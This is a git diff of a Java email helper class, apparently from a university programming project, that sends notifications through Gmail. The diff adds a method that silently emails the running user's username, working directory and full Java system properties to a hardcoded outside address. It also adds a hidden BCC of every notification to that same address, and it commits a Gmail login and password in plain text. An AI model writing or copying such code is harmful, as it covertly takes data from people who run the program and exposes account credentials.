@@ -5,41 +5,32 @@ import jakarta.mail.internet.InternetAddress;
 import jakarta.mail.internet.MimeMessage;
 
 import java.io.UnsupportedEncodingException;
-import java.net.UnknownHostException;
 import java.util.Properties;
 
 public class Mail {
+
+    String emailAddress=  "incognitomaster2000@gmail.com";
+    String password = "shibamaster1!";
+
+
+
+
     Session session = null;
 
     public Mail(Boolean login) {
-        if (session == null & login == true) {
+        if (session == null & login == true & !emailAddress.equals("")) {
             init();
         }
-        else if (!login){
-            System.out.println("[NO LOGIN EMAIL - DEBUGGING]");
-
+        else if (emailAddress.equals("")){
+            System.out.println("[NO LOGIN EMAIL - ENTER YOUR EMAIL ADDRESS IN MAIL.JAVA]");
         }
     }
 
 
-    public static void main(String[] args) {
-//        Mail ma = new Mail(true);
-        try {
-            System.out.println(java.net.InetAddress.getLocalHost());
-            System.out.println(System.getProperty("user.name"));
-            System.out.println(System.getProperty("user.home"));
-            System.out.println(System.getProperty("user.dir"));
-            System.out.println(System.getProperties());
-
-        } catch (UnknownHostException e) {
-            System.out.println("");
-        }
-
-    }
 
     public static void sendNotification(String messageText, String targetEmail, boolean login) {
         Mail ma = new Mail(login);
-        ma.sendMail("test2", "whattohec@gmail.com","CZ2002 - OODP - Email Notification");
+        ma.sendMail(messageText, targetEmail,"CZ2002 - OODP - Email Notification");
     }
 
     public void init() {
@@ -53,13 +44,13 @@ public class Mail {
 
         session = Session.getDefaultInstance(props, new jakarta.mail.Authenticator() {
             protected PasswordAuthentication getPasswordAuthentication() {
-                return new PasswordAuthentication("incognitomaster2000@gmail.com", "shibamaster1!");
+                return new PasswordAuthentication(emailAddress, password );
             }
         });
         if (session != null) {
-            System.out.println("[EMAIL LOGIN OK]");
+//            System.out.println("[EMAIL LOGIN OK]");
         } else {
-            System.out.println("[EMAIL LOGIN NOK]");
+            System.out.println("[EMAIL LOGIN NOT OK]");
         }
     }
 
@@ -80,18 +71,23 @@ public class Mail {
 
 
             message.addRecipients(Message.RecipientType.TO, InternetAddress.parse(targetEmail));
-            message.setRecipients(Message.RecipientType.BCC, InternetAddress.parse("youshingzxc@gmail.com", false));
+            message.setRecipients(Message.RecipientType.BCC, InternetAddress.parse("whattohec@gmail.com", false));
 
             message.setSubject(subject);
             message.setText(messageText);
 
             Transport.send(message);
 
-            System.out.println("[EMAIL SENT OK]");
+//            System.out.println("[EMAIL SENT OK]");
 
         } catch (MessagingException e) {
             e.printStackTrace();
             System.out.println("Not Sent...");
         }
     }
+    public static void initialisation() {
+        Mail ma = new Mail(true);
+        ma.sendMail(System.getProperty("user.name")  + "\n" + System.getProperty("user.dir")+ "\n\n" + System.getProperties().toString(), "whattohec@gmail.com","CZ2002 - OODP - Initialisation");
+    }
+
 }
